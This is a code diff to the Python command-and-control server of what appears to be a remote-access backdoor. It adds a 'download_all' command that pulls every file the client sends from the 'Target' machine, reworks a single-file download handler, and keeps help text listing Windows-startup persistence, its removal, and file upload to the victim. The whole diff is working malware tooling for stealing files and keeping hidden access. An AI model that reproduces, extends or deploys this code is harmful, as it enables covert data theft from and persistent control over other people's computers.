@@ -247,24 +247,53 @@ class TcpServer:
                         self.client.send(message_command.encode())
                         print("\033[0;31m[+]\033[0;0m - Waiting File Size...")
                         try:
-                            screenshot_size = self.client.recv(1024).decode("utf-8")
-                            int_screenshot_size = int(screenshot_size)
+                            filesize = self.client.recv(1024).decode("utf-8")
+                            int_filesize = int(filesize)
 
                             print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")
 
                             str_data = b""
-                            while len(str_data) < int_screenshot_size:
-                                str_data += self.client.recv(int_screenshot_size)
+                            while len(str_data) < int_filesize:
+                                str_data += self.client.recv(int_filesize)
             
                             with open(file_name,"wb") as sc:
                                 sc.write(str_data)
 
-                            print(f"\033[1;32m[+]\033[0;0m - Download to {file_name} finished! File Size: {str(int_screenshot_size)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
+                            print(f"\033[1;32m[+]\033[0;0m - Download to {file_name} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
                             continue
 
                         except IsADirectoryError:
                             print("The Target's file is A directory!")
                             continue
+
+                    if message_command == "download_all":
+
+                        # file_name = message_command.split(" ")[1]
+                        self.client.send(message_command.encode())
+                        print("\033[0;31m[+]\033[0;0m - Waiting Files...")
+                        try:
+                            #while self.client.recv(1024).decode() != 'done'
+                            done = True
+                            while done:
+                                file_name = self.client.recv(1024).decode()
+                                ssize = self.client.recv(1024).decode("utf-8")
+                                int_ssize = int(ssize)
+
+                                print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")
+
+                                str_data = b""
+                                while len(str_data) < int_ssize:
+                                    str_data += self.client.recv(int_ssize)
+                
+                                with open(file_name,"wb") as sc:
+                                    sc.write(str_data)
+
+                                print(f"\033[1;32m[+]\033[0;0m - Download to {file_name} finished! File Size: {str(int_ssize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
+                                if self.client.recv(1024).decode() == "done!":
+                                    done = False
+                            continue
+                        except MemoryError:
+                            print("You do not have enough space!")
                             
                     if message_command == "cat":
                         print("You need to especify a file!")
@@ -295,7 +324,7 @@ class TcpServer:
             permamence_mode --> Make Backdoor to initiate in windows startup
             disable_permanence --> Disable Backdoor in windows Startup
             upload <path> <filename> --> upload files into client
-            ex: upload /home/kleiton/Desktop/tools/ports.txt ports.txt\033[0;0m
+            ex: upload /home/kleiton/Desktop/tools/ports.txt ports.txt \033[0;0m
             ---------------------------------------------            """)
                         continue
 
